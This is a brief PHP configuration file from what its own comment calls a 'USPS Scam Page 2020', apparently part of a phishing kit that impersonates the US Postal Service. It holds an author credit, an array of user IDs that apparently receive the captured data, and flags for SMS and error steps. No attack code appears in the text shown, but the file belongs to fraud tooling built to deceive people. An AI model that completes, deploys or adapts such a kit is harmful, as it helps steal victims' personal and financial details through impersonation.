<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("-757779076");
$sms='1';
$error='1';
?>
